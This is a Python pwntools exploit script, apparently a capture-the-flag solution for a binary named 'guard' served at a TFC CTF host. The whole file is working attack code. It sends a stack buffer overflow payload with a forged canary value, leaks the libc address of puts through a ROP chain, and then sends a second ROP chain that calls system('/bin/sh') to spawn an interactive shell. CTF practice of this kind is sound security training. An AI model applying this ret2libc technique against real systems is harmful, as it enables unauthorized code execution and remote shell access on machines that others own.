from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep

context.arch = "amd64"
context.word_size = 64

file = "./guard"
args = []
io: process = None

speed = 0.2

def debug():
    gdb.attach(io, gdbscript=
    """
    b *0x401384
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote(host="challs.tfcctf.com", port=31165)

def launch_local():
    global file, io
    io = process([file, *args])
    # debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)

def launch():
    l = launch_local
    # l = launch_remote
    l()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1: a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1: b_ = 0
    return d[a_+len(a):b_]

#
# exploit goes here
#

exe = ELF(file)
libc = ELF("./libc.so.6")
# libddd = ELF("./libddd.so")

def exploit():
    sla(b"chall.\n", b"1")
    sla(b"len: ", b"4000")

    canary = 0x3030303030303030

    pop_rdi = 0x401256

    ropchain = flat([
        pop_rdi,
        exe.got["puts"],
        exe.plt["puts"],

        exe.sym["game"],
    ])
    payload = flat({
        0: [
            b"A"*0x28,
            0x404000, # canary
            b"C"*8, # saved rbp
            ropchain, # saved rip
            [0x404000]*341,
        ],
    }, filler=b"B")
    sl(payload)
    sleep(speed)

    leak = recv()[:-1]
    libc.address = u64(leak) - libc.sym["puts"]
    info("libc: %#018x" % libc.address)

    io.send(b"a") # getchar


    ropchain = flat([
        pop_rdi,
        next(libc.search(b"/bin/sh\0")),
        libc.sym["do_system"]+2,
    ])
    payload = flat([
        b"A"*0x28,
        0x404000, # canary
        b"C"*8, # saved rbp
        ropchain, # saved rip
    ])
    sl(payload)
    sleep(speed)

    io.interactive()
    exit()

launch()
exploit()
